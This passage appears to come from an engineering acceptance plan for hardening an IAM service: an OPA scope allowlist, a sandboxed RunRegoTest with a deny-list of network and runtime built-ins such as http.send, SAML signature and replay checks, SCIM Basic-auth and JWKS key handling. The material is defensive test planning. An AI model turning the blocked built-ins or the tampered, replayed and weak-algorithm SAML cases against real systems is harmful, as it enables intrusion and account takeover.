| #21 | `internal/service/opa_scope/allowlist_integration_test.go` | `Test_OpaScope_Allowed_Happy`, `Test_OpaScope_UnknownScope_Denied`, `Test_OpaScope_EmptyAllowlist_FailsClosed` |
| #23 | `internal/service/authorize_service_checkrelation_test.go` | `Test_CheckRelation_ContextualTuples_Plumbed`, `Test_CheckRelation_MalformedContext_InvalidArgument`, `Test_CheckRelation_OversizedContext_InvalidArgument` |
| #25 | `internal/apps/kacho/api/internal_authorize/handler_reloadmodel_test.go` | `Test_ReloadModel_ClusterAdmin_HappyPath`, `Test_ReloadModel_Anonymous_PermissionDenied`, `Test_ReloadModel_NonAdmin_PermissionDenied` |
| #26 | `internal/apps/kacho/api/internal_authorize/handler_runregotest_test.go` | `Test_RunRegoTest_Happy_Bounded`, `Test_RunRegoTest_ForbiddenBuiltinHttpSend_Rejected`, `Test_RunRegoTest_CpuTimeout_Exceeded`, `Test_RunRegoTest_UnknownImport_Denied`, `Test_RunRegoTest_NonAdmin_PermissionDenied`, `Test_RunRegoTest_AllForbiddenBuiltins_TableTest` (table of `time.now_ns`, `net.lookup_ip_addr`, `opa.runtime`, `io.jwt.decode`, `crypto.hmac.*`, `rand.*`) |
| #40 | `internal/apps/kacho/api/saml/sp_handler_integration_test.go` | `Test_SAML_HappyVerifyAndJIT`, `Test_SAML_TamperedSignature_Rejected`, `Test_SAML_ExpiredNotOnOrAfter_Rejected`, `Test_SAML_Replay_Rejected`, `Test_SAML_WeakAlgRsaSha1_Rejected`, `Test_SAML_WrongRecipient_Rejected`, `Test_SAML_WrongAudience_Rejected`, `Test_SAML_MultiIdpRoutingByIssuer` |
| #41 | `internal/apps/kacho/api/scim/auth_integration_test.go` | `Test_SCIM_BasicAuth_HappyCRUD`, `Test_SCIM_MissingHeader_401`, `Test_SCIM_WrongCreds_401_ConstantTime`, `Test_SCIM_UnknownUser_401_NoEnumeration`, `Test_SCIM_LastUsedAtTouched` |
| #42 | `internal/service/jwks/store_integration_test.go` + `internal/service/caep/set_signer_integration_test.go` | `Test_JWKS_BootstrapGeneratesKey`, `Test_JWKS_RotationAtomic_ConcurrentCallers`, `Test_JWKS_OverlapWindow_BothKeysServed`, `Test_JWKS_EndpointReturnsPublicOnly`, `Test_SetSigner_RS256_VerifyableExternally`, `Test_CAEP_StubSubscriber_VerifiesViaJwks`, `Test_CAEP_RevokedKid_SubscriberRejects` |

All tests testcontainers Postgres (migrations 0001-0028); OpenFGA testcontainer for #23 / #25 / #26 (cluster-admin check uses real FGA). #40 SAML fixture: pre-generated test cert + assertion fixtures committed under `internal/apps/kacho/api/saml/testdata/`. #41 SCIM: bcrypt hashes pre-computed (cost 12) in test fixture. #42 JWKS: RSA 2048 keygen on test setup (~50ms), real signed JWTs, real `crewjam/saml` or `golang-jwt/jwt/v5` verify.

### 7.2 Newman E2E cases

Fixture requirements:
- **#21 (OPA scope-allowlist)**: standard fixture (auth-fixtures setup.sh) + admin-authenticated user with cluster-admin grant. Newman cases: `OPA-SCOPE-ALLOWLISTED-OK`, `OPA-SCOPE-UNKNOWN-403`, `OPA-SCOPE-EMPTY-ALLOWLIST-FAILCLOSED` (uses fixture that DROPs seed before run).
- **#23 (CheckRelation context)**: requires conditional binding fixture — extend `authz-fixtures/setup.sh` to seed a conditional binding (FGA model add condition `mfa_fresh_required`). Newman cases: `CHECKRELATION-WITH-MFA-CONTEXT-ALLOW`, `CHECKRELATION-NO-CONTEXT-DENY`, `CHECKRELATION-MALFORMED-CONTEXT-400`.
- **#25 (ReloadModel)**: cases `RELOAD-MODEL-CLUSTER-ADMIN-OK`, `RELOAD-MODEL-ANON-401`, `RELOAD-MODEL-NON-ADMIN-403`.
- **#26 (RunRegoTest)**: cases `RUNREGOTEST-HAPPY`, `RUNREGOTEST-HTTP-SEND-BLOCKED`, `RUNREGOTEST-CPU-TIMEOUT`, `RUNREGOTEST-UNKNOWN-IMPORT-DENIED`, `RUNREGOTEST-NON-ADMIN-403`.
- **#40 SAML**: **needs fixture IdP** — DEC-W3.1-3 + OQ context. Recommend either:
  - **Option A**: pre-generated test cert + raw XML AuthnResponse fixtures committed under `tests/newman/fixtures/saml/`. Newman script POSTs raw XML to ACS endpoint; no live IdP needed. Simplest, used by `crewjam/saml`'s own test suite. **Recommended.**
  - **Option B**: Kratos OIDC stub container in newman test-stack — orchestration complexity outweighs benefit for W3.1 (which already has SAML setup elsewhere via crewjam test fixtures). Defer to W3.4 freeze if e2e-live SSO needed.
- **#41 SCIM**: extend `auth-fixtures/setup.sh` to insert `scim_basic_credentials` row via psql. Newman cases: `SCIM-BASIC-HAPPY-CRUD`, `SCIM-MISSING-AUTH-401`, `SCIM-WRONG-CREDS-401`.
- **#42 CAEP**: **needs stub subscriber** — run small HTTP server alongside newman that listens for SET POSTs and validates against `/.well-known/jwks.json`. Implementable as Node.js stub in `tests/newman/stub_subscriber.js` (~50 lines using `jose` library). Newman cases: `CAEP-SET-SIGNED-SUBSCRIBER-ACCEPTS`, `CAEP-SET-REVOKED-KID-SUBSCRIBER-REJECTS`, `CAEP-JWKS-NO-PRIVATE-LEAK`, `JWKS-ENDPOINT-PUBLIC-CACHEABLE`.

### 7.3 RED→GREEN evidence per finding

Per Запрет #12 strict test-first. PR description must include for each finding:

| Finding | RED commit | GREEN commit | RED test output | GREEN test output |
|---|---|---|---|---|
| #21 | `red(#21): opa-scope-allowlist tests` | `green(#21): impl + migration 0025` | `Test_OpaScope_UnknownScope_Denied: handler does not check allowlist (200 instead of 403)` | `... PASS` |
| #23 | `red(#23): checkrelation context tests` | `green(#23): plumb ContextualTuples` | `Test_CheckRelation_ContextualTuples_Plumbed: assertion failed: ContextualTuples nil` | `... PASS` |
| #25 | `red(#25): reloadmodel auth tests` | `green(#25): cluster-admin gate` | `Test_ReloadModel_NonAdmin_PermissionDenied: got OK, want PermissionDenied` | `... PASS` |
| #26 | `red(#26): runregotest sandbox tests` | `green(#26): sandbox + cpu/import allowlist` | `Test_RunRegoTest_ForbiddenBuiltinHttpSend_Rejected: got Allowed=true, want forbidden builtin` | `... PASS` |
| #40 | `red(#40): saml verify tests` | `green(#40): impl crewjam wiring + replay store` | `Test_SAML_TamperedSignature_Rejected: got 302, want 401` | `... PASS` |
| #41 | `red(#41): scim basic auth tests` | `green(#41): middleware + migration 0027` | `Test_SCIM_MissingHeader_401: got 201, want 401` | `... PASS` |
| #42 | `red(#42): jwks + caep sign tests` | `green(#42): jwks store + set signer + endpoint + migration 0026` | `Test_CAEP_StubSubscriber_VerifiesViaJwks: subscriber rejected (alg=none not accepted)` | `... PASS` |

### 7.4 Anti-leak property tests (always-on regression)

- `Test_JWKS_Endpoint_NeverReturnsPrivateMaterial` — fuzz-style: spin up iam-server, hit `/.well-known/jwks.json` 100 times with various headers (`Accept`, `User-Agent`), assert response body never contains substrings `BEGIN PRIVATE KEY`, `BEGIN RSA PRIVATE KEY`, `"d":`, `master_key`, `private_key_pem`. Runs on every CI.
- `Test_SCIM_AuthFailureTimingConstant` — measures p50/p95/p99 of failure-path response time across 1000 requests, asserts p99 within 2× of p50 (constant-time bcrypt).
- `Test_SAML_AuditLogContainsNoRawAttackerInput` — for each `saml_signature_invalid` case, assert audit log fields contain only `tenant`, `idp`, hash-fingerprint of response — never raw email/subject from attacker-controlled body (prevent log injection).

### 7.5 Cross-suite coverage check

`tests/newman/coverage.py --min 100` (W0.1 gate) — new RPCs added в W3.1 (`InternalScimCredentialService.*`, plus `RunRegoTest` extension) must have ≥1 happy + ≥1 negative newman case each. Coverage gate fails CI if not.

---

## 8. Definition of Done

### Per-finding DoD

- [ ] **#21**: `opa_scope_allowlist` table created (migration 0025); bootstrap-seed for `data.iam.{users,roles,bindings,projects}` present; handler enforces in `RunRegoTest` + future OPA REST paths; empty-allowlist fails-closed; integration tests + newman cases GREEN; structured log emits `opa_scope_not_allowlisted` on denies.
- [ ] **#23**: `CheckRelation` plumbs `request_context` to OpenFGA `ContextualTuples`; size-cap (32 keys, 1KB/value) enforced with `InvalidArgument`; conditional binding ABAC scenario allow/deny depending on context; integration test confirms FGA Check called with non-nil ContextualTuples.
- [ ] **#25**: `ReloadModel` requires cluster-admin grant; anonymous → `PermissionDenied("authentication required")`; non-admin authenticated → `PermissionDenied("ReloadModel requires cluster-admin grant")`; cluster-admin → succeeds + audit log; same applied to `RunRegoTest` (#26 parity).
- [ ] **#26**: Sandbox enforces 4 dimensions (parser deny-list / CPU timeout / memory cap / import allowlist); table-test covers all forbidden built-ins (`http.send`, `time.now_ns`, `net.lookup_ip_addr`, `opa.runtime`, `io.jwt.decode`, `crypto.hmac.*`, `rand.*`); CPU timeout test asserts deadline fires within ±50ms of configured.
- [ ] **#40**: SAML AuthnResponse verification implements all 7 checks (signature / algo allowlist / InResponseTo / NotBefore / NotOnOrAfter / Recipient / Audience); replay store (`saml_response_replay`) prevents double-consume via PK conflict; rsa-sha1 explicitly rejected; tampered signature → 401; JIT-provisioning generates `Operation` (async via `UserService.Create`); audit events emit for all 7 fail-modes.
- [ ] **#41**: SCIM endpoints require Basic-auth header verification; per-tenant `scim_basic_credentials`-table populated; bcrypt cost 12; missing/wrong → 401 with constant-time response latency (±20ms tolerance); `last_used_at` updated on success; W2.B.2 dead-code (`BasicAuthOrgID=""`) removed.
- [ ] **#42**: JWKS table (`jwks_keys`) created with `partial UNIQUE WHERE active=true` enforcing single active key; bootstrap generates RSA 2048 keypair on first startup; private key AES-GCM encrypted at rest; `/.well-known/jwks.json` endpoint serves public-key-half only (no `d/p/q/dp/dq/qi` fields ever); CAEP SET signing uses RS256 with `kid` header; subscriber-side verify path tested via stub subscriber; rotation cron implemented (monthly); concurrent-rotation test asserts atomic single-active invariant.

### Global DoD

- [ ] `acceptance-reviewer` ✅ APPROVED данного doc; all OQs (W3.1-1..10) resolved
- [ ] Branch `KAC-W3.1` создан в `kacho-iam`, `kacho-proto`, `kacho-api-gateway`, `kacho-deploy` (per-repo branches in dep-order)
- [ ] **RED phase commit** (per finding, ordered): all §7.1 integration tests + §7.2 newman cases written, CI red — RED evidence in PR description per finding per §7.3
- [ ] **GREEN phase commits** (one logical commit per finding, ordered for review):
  - [ ] #21 — opa_scope_allowlist (RED W3.1-21-* → GREEN)
  - [ ] #23 — CheckRelation ContextualTuples (RED W3.1-23-* → GREEN)
  - [ ] #25 — ReloadModel cluster-admin gate (RED W3.1-25-* → GREEN)
  - [ ] #26 — RunRegoTest sandbox (RED W3.1-26-* → GREEN)
  - [ ] #40 — SAML verify (RED W3.1-40-* → GREEN)
  - [ ] #41 — SCIM Basic-auth (RED W3.1-41-* → GREEN)
  - [ ] #42 — JWKS + CAEP SET signing (RED W3.1-42-* → GREEN)
- [ ] Anti-leak property tests (§7.4) GREEN
- [ ] Cross-suite coverage check (§7.5) `coverage.py --min 100` GREEN
- [ ] All 7 findings closed per remediation plan §1.3 Chunk 5
- [ ] `make e2e` smoke on dev-kind shows: cluster-admin can ReloadModel; non-admin cannot; SAML SSO works against `crewjam/saml` test fixture; SCIM creds enforced; CAEP push verifies via published JWKS
- [ ] kacho-iam CI green (unit + integration + race + newman e2e)
- [ ] kacho-proto CI green (`buf lint`, `buf breaking` — additive only)
- [ ] kacho-api-gateway CI green (REST mux registration of `/.well-known/jwks.json`)
- [ ] No new TODO / FIXME in diff (per Запрет #11; reviewer rejects on any)
- [ ] PRs merged (kacho-proto first, then kacho-iam, then kacho-api-gateway)
- [ ] Vault обновлён (per §9 below)
- [ ] YouTrack KAC-W3.1:
  - [ ] In Progress on impl start
  - [ ] PR links commented (per-repo: proto, iam, gateway)
  - [ ] Done on merge + smoke + newman GREEN
- [ ] W3 tracker `2026-05-23-iam-prod-ready-wave3.md` updated: W3.1 row → ✅ done + date; remaining W3.2/W3.3/W3.4 unblocked
- [ ] Master plan §«Definition of Done» updated: «44 findings closed» → 7 closer to total; «0 stub on surface» — SCIM auth stub gone, SAML 501 guard gone, CAEP stub-sign gone

---

## 9. Vault updates (per CLAUDE.md §«Vault discipline»)

### NEW notes

- **`obsidian/kacho/resources/iam-opa-scope-allowlist.md`** (NEW, 1-3KB):
  - Concept: per-tenant whitelist of legitimate OPA scope-strings for `RunRegoTest` + future OPA REST endpoints.
  - Storage: `kacho_iam.opa_scope_allowlist (tenant_id, scope) PK`.
  - Disambiguation from Federation `FederationTrustPolicy.allowed_scopes` (OAuth scope) per DEC-W3.1-1.
  - Bootstrap-seed: `data.iam.users/roles/bindings/projects` for `*system` tenant.
  - Gotchas: empty allowlist = fail-closed all (NOT allow-all).
  - Links: `[[../packages/iam-service-opa-scope]]`, `[[../rpc/iam-opa-service]]`, `[[../rpc/iam-internal-authorize-service]]`.

- **`obsidian/kacho/resources/iam-jwks.md`** (NEW, 1-3KB, **critical security note**):
  - Concept: RSA keypair store for CAEP SET signing + future OIDC ID-token signing.
  - Storage: `kacho_iam.jwks_keys (kid PK, alg, public_key_pem, private_key_pem_encrypted bytea, active, created_at, rotated_at, expires_at)`.
  - **§«Инфра-чувствительные данные» emphasis**: private key (encrypted at rest via `KACHO_IAM_JWKS_MASTER_KEY` AES-GCM SealedSecret) NEVER returned via any RPC. Public half exposed via standard `/.well-known/jwks.json` (RFC 7517) — anonymous-readable by design (standard for JWKS).
  - Invariants (Запрет #10): `partial UNIQUE (active) WHERE active=true` — exactly one active key at a time. Rotation atomic via single-tx UPDATE+INSERT, concurrent rotations resolved by PK/partial-UNIQUE conflict → only one winner.
  - Rotation policy (DEC-W3.1-4): 30-day rolling, 60-day overlap. Manual rotation for compromise-recovery.
  - Gotchas: never log `private_key_pem_encrypted` even encrypted; never include in audit-log body; CAEP egress signed with `kid`-headered JWS.
  - Links: `[[../packages/iam-service-jwks]]`, `[[../edges/iam-jwks-endpoint]]`, `[[../edges/iam-to-caep-subscribers]]`.

- **`obsidian/kacho/edges/iam-to-saml-idp.md`** (NEW, 1-3KB):
  - Edge: kacho-iam (as SP) ← SAML IdP (Okta/Azure AD/etc, external).
  - Protocol: SAML 2.0 AuthnResponse POST to `/saml/v2/acs?tenant=<>&idp=<>`.
  - Sync (request-response): IdP-initiated POST → iam verifies signature → JIT-provisions user → 302 redirect.
  - Verify-stack: 7 checks (signature / algo allowlist / InResponseTo / NotBefore / NotOnOrAfter / Recipient / Audience).
  - Library: `crewjam/saml` (DEC-W3.1-3).
  - Replay protection: `saml_response_replay`-table PK on `response_id`; PK conflict = 23505 = 401.
  - Error handling: any verify-fail → 401 + structured audit log (`saml_signature_invalid`/`saml_replay_rejected`/etc); no JIT-provisioning attempted; no row written.
  - History: KAC-W3.1 — initial verify impl (replaces W2.B.1 501-guard).
  - Links: `[[../resources/iam-federation-trust-policy]]`, `[[../rpc/iam-federation-service]]`.

- **`obsidian/kacho/edges/iam-to-scim-clients-authn.md`** (NEW, 1-3KB):
  - Edge: external SCIM v2 client (HR system / Okta SCIM provisioner) → kacho-iam SCIM endpoints.
  - Protocol: SCIM v2 (RFC 7644) over HTTPS; Basic-auth header (W3.1) or Bearer (W2.B.2 default).
  - Sync (request-response): vendor POST/GET/PUT/DELETE to `/scim/v2/<tenant>/Users` or `/scim/v2/<tenant>/Groups`.
  - Authn-stack: Basic-auth → `scim_basic_credentials` lookup → bcrypt cost-12 compare (constant-time + dummy compare on unknown user).
  - Error handling: missing/wrong header → 401 with `WWW-Authenticate: Basic realm="SCIM"`; no enumeration possible (constant-time response).
  - History: KAC-W3.1 — Basic-auth enabled (replaces W2.B.2 dead-code).
  - Links: `[[../resources/iam-scim-credential]]` (if created), `[[../rpc/iam-scim-service]]`.

- **`obsidian/kacho/edges/iam-jwks-endpoint.md`** (NEW, 1-3KB):
  - Edge: external SET subscribers / OIDC clients → kacho-iam `/.well-known/jwks.json`.
  - Protocol: HTTPS GET; anonymous read (no auth — standard for JWKS per RFC 7517).
  - Sync (request-response): client fetches, caches per `Cache-Control: max-age=300`.
  - Payload: JWK Set per RFC 7517: `{keys: [{kty:"RSA", use:"sig", alg:"RS256", kid:..., n:..., e:...}]}` — public-key half only, NEVER private material.
  - Rotation handling: during 60-day overlap window, both old and new keys served — subscribers verify in-flight SETs against either.
  - History: KAC-W3.1 — initial endpoint (paired with CAEP SET signing impl).
  - Links: `[[../resources/iam-jwks]]`, `[[../edges/iam-to-caep-subscribers]]`.

### UPDATE existing notes

- **`obsidian/kacho/rpc/iam-federation-service.md`** — update §«Methods» to note SAML ACS endpoint now does full verify (drop 501-guard mention); add §«Verify-stack» summary linking to `[[../edges/iam-to-saml-idp]]`; update «History» with KAC-W3.1.
- **`obsidian/kacho/rpc/iam-opa-service.md`** (create if missing — currently bundled in `iam-internal-authorize-service.md`?) — note `RunRegoTest` now sandbox-bounded (parser deny-list + CPU timeout + memory cap + import allowlist) and cluster-admin gated; note `ReloadModel` cluster-admin gated; note scope-allowlist enforced for all OPA endpoints; link to `[[../resources/iam-opa-scope-allowlist]]`.
- **`obsidian/kacho/rpc/iam-scim-service.md`** — update §«Authn» to specify Basic-auth (per W3.1) + Bearer (per W2.B.2); link to `[[../edges/iam-to-scim-clients-authn]]`; note per-tenant credential model (`scim_basic_credentials`-table).
- **`obsidian/kacho/rpc/iam-caep-service.md`** — update §«Push signature» to specify JWS RS256 with `kid` header from JWKS (drop stub-sign mention); link to `[[../resources/iam-jwks]]` and `[[../edges/iam-jwks-endpoint]]`.

### KAC trail note

- **`obsidian/kacho/KAC/KAC-W3.1.md`** (NEW, ≤3KB, per CLAUDE.md «KAC-тикеты — обязательный trail»):
  - `Status: in-progress` (until merge → `done`)
  - `Type: epic-subtask` (subtask of master `KAC-iam-prod-ready`)
  - `Repos: kacho-iam, kacho-proto, kacho-api-gateway`
  - `PRs: <fill in as opened>`
  - `## Что и зачем`: 1-2 abzaca — closes 7 findings from remediation plan Chunk 5 (federation/SSO internals: OPA scope-allowlist, CheckRelation context, ReloadModel cluster-admin gate, RunRegoTest sandbox, SAML verify, SCIM Basic-auth, CAEP SET signing).
  - `## Затронутые сущности vault`: list of NEW + UPDATE entries above.
  - `## Acceptance / Definition of Done`: checklist from §8 above.
  - `## Связанные тикеты`: predecessors (W1.6, W2.B.1, W2.B.2, W2.B.8, W2.A); siblings (W3.2 observability, W3.3 SPIRE+Cilium, W3.4 freeze).
  - `#kac #epic #security`

---

## 10. Out of scope (явно — на следующие chunks)

| Что | Куда |
|---|---|
| Observability customisation (dashboards/alerts/metrics for anti-anon, SAML-reject, SCIM-401, SET-badsig, JWKS-fetch-fail, rego-sandbox-block, opa-scope-deny) | **W3.2** |
| SPIRE + Cilium ServiceMesh wiring (kacho-iam за SVID) | **W3.3** |
| Freeze checklist (security review, pentest readiness, runbook completeness, secret rotation playbook) | **W3.4** |
| Admin-UI surfaces for `InternalScimCredentialService.{Create,Delete,List}` (W3.1 implements minimal Create/Delete/List RPCs; UI wiring) | W4-admin-UI sprint |
| Admin-UI surfaces for `InternalOpaScopeAllowlistService.{Add,Remove,List}` | W4-admin-UI sprint |
| Live IdP integration testing (Kratos OIDC stub container) — beyond crewjam/saml fixture-based newman tests | W3.4 freeze if needed; else deferred |
| OIDC ID-token signing (uses same JWKS keypair from #42 — infrastructure ready, signing handler not implemented) | future OIDC sub-phase |
| CAEP subscriber discovery + push-retry queue beyond W2.B.8 scaffolding | W2.B.8 follow-up if gaps |
| OPA bundle runtime fail-closed (sidecar config; W1.3 §0.1 explicit out-of-scope) | dedicated `kacho-iam OpaBundleService` resilience chunk |
| Per-resource authz cache invalidation on tenant SCIM-provisioned user deactivate | already in W1.2 |
| SAML SP-initiated (we issue AuthnRequest); W3.1 implements IdP-initiated ACS only | future SAML sub-phase if SP-initiated needed |

---

## 11. Traceability — finding-id ↔ scenario-id ↔ source-line

| Finding (rem. plan §1.3) | GWT Scenarios | Code-target (kacho-iam, post-W3.1) | Test-name |
|---|---|---|---|
| **#21** (P0 OPA scope-allowlist) | W3.1-21-HAPPY, W3.1-21-UNKNOWN, W3.1-21-EMPTY-FAIL-CLOSED | `internal/service/opa_scope/allowlist.go`, `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest`, `migrations/0025_opa_scope_allowlist.sql` | `Test_OpaScope_*`, newman `OPA-SCOPE-*` |
| **#23** (P1 CheckRelation context) | W3.1-23-HAPPY, W3.1-23-CONTEXT-DENY, W3.1-23-MALFORMED | `internal/service/authorize_service.go::CheckRelation`, `internal/apps/kacho/api/internal_iam/handler.go::Check` | `Test_CheckRelation_*`, newman `CHECKRELATION-*` |
| **#25** (P0 ReloadModel auth) | W3.1-25-HAPPY, W3.1-25-ANON-DENY, W3.1-25-NON-ADMIN | `internal/apps/kacho/api/internal_authorize/handler.go::ReloadModel` (cluster-admin gate via `iam.IsClusterAdmin`) | `Test_ReloadModel_*`, newman `RELOAD-MODEL-*` |
| **#26** (P0 RunRegoTest sandbox) | W3.1-26-HAPPY, W3.1-26-FORBIDDEN-HTTP, W3.1-26-CPU-TIMEOUT, W3.1-26-UNKNOWN-IMPORT, W3.1-26-NON-ADMIN | `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest` (sandbox + cluster-admin + import-allowlist) | `Test_RunRegoTest_*`, newman `RUNREGOTEST-*` |
| **#40** (P0 SAML verify) | W3.1-40-HAPPY, W3.1-40-TAMPERED, W3.1-40-EXPIRED, W3.1-40-REPLAY, W3.1-40-WEAK-ALG, W3.1-40-WRONG-RECIPIENT | `internal/apps/kacho/api/saml/sp_handler.go` (crewjam/saml wiring + `postgresReplayTracker`), `migrations/0028_saml_response_replay.sql` | `Test_SAML_*`, newman `SAML-*` (with fixture-based assertions per §7.2) |
| **#41** (P0 SCIM Basic-auth) | W3.1-41-HAPPY, W3.1-41-MISSING, W3.1-41-WRONG-CREDS, W3.1-41-UNKNOWN-USER | `internal/apps/kacho/api/scim/auth.go::BasicAuthMiddleware`, `cmd/kacho-iam/phase6_listeners.go` (cred loading), `migrations/0027_scim_basic_credentials.sql` | `Test_SCIM_*`, newman `SCIM-*` |
| **#42** (P0 CAEP SET signature) | W3.1-42-HAPPY, W3.1-42-REVOKED-KEY, W3.1-42-ROTATION-OVERLAP, W3.1-42-NO-LEAK, W3.1-42-ROTATION-ATOMIC | `internal/service/jwks/store.go`, `internal/service/caep/set_signer.go`, `cmd/kacho-iam/main.go` (`/.well-known/jwks.json`), `internal/handler/iamhooks/caep_egress_handler.go` (replace stub-sign), `migrations/0026_jwks_keys.sql` | `Test_JWKS_*`, `Test_SetSigner_*`, `Test_CAEP_*`, newman `CAEP-*`, `JWKS-*` |

---

## 12. Ссылки

- Workspace правила: `../../CLAUDE.md` (запреты #1/#2/#6/#10/#11/#12; §«Инфра-чувствительные данные»; vault discipline)
- IAM-specific: `../../project/kacho-iam/CLAUDE.md`
- Source of findings: `../superpowers/plans/2026-05-21-iam-authz-review-remediation-plan.md` §1.3 Chunk 5 (items 5.1, 5.2, 5.3, 5.4, 5.5, 5.6, 5.8)
- Master plan: `../superpowers/plans/2026-05-23-iam-prod-ready-master.md` (Waves overview; W3 = finalize)
- Predecessor acceptance docs:
  - `sub-phase-W1.6-remediation-chunk2-in-service-authz-acceptance.md` (anti-anon allowlist primitive used for #25 #26 baseline)
  - W2.B.1 SAML ACS guard (501) — predecessor; W3.1 replaces guard with real verify
  - W2.B.2 SCIM endpoints wired — predecessor; W3.1 closes auth gap
  - W2.B.8 CAEP scaffolding with stub-sign — predecessor; W3.1 replaces with JWS RS256 + JWKS
  - W2.A catalog/permissions unification — predecessor; W3.1 #21 references catalogued scopes
- Specs:
  - `00-overview-and-scope.md`
  - `01-architecture-and-services.md` (Internal vs public listener separation per §«Запреты» #6)
  - `02-data-model-and-conventions.md` (envelope, error-codes table; W3.1 follows YC-style error texts: «Illegal argument scope: ...», «authentication required»)
  - `03-deployment-and-operations.md`
  - `04-roadmap-and-phasing.md`
- External standards referenced:
  - **RFC 7517** — JSON Web Key (JWK) and Key Set (JWKS) — JWKS endpoint format
  - **RFC 7515** — JSON Web Signature (JWS) — SET signing format
  - **RFC 7518** — JSON Web Algorithms (JWA) — RSA private/public field names (`n/e` public; `d/p/q/dp/dq/qi` private)
  - **RFC 7644** — SCIM v2 — REST CRUD semantics
  - **RFC 8417** — Security Event Token (SET) — CAEP payload format
  - **OASIS SAML 2.0 Core** — AuthnResponse / Assertion verification rules
  - **OpenFGA SDK** — ContextualTuples API
- Libraries planned:
  - **`crewjam/saml`** v0.4.x — SAML 2.0 SP impl with replay-tracker hook
  - **`golang-jwt/jwt/v5`** — JWS signing for SET / JWKS
  - **`open-policy-agent/opa`** (Go SDK) — Rego AST walk + sandboxed eval
  - **`golang.org/x/crypto/bcrypt`** — SCIM Basic-auth password hashing
- Reference impl (parity для cluster-admin gate): `internal/service/cluster_admin/check.go` (existing `IsClusterAdmin` helper from W1.5 BG.ApproveB path)
- Reference impl (parity для outbox-pattern, rotation cron): `kacho-corelib/outbox/` + `kacho-iam/internal/service/fga_outbox/drainer.go` (W1.1)
